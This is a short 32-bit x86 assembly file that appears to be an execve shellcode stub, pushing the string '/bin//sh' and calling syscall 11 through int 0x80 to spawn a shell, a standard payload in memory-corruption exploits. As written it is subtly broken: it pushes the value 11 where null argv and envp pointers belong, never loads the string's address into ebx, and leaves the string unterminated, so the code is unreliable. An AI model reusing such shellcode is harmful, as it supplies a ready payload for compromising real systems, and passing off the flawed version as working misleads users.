BITS 32
section .text

global _start

_start:
	xor  eax, eax
	mov  eax, 11
	push eax		;const char *const envp[]
	push eax		;const char *const argv[]
	push 0x68732f2f         ; "//sh"
	push 0x6e69622f         ; "/bin"
	int  0x80

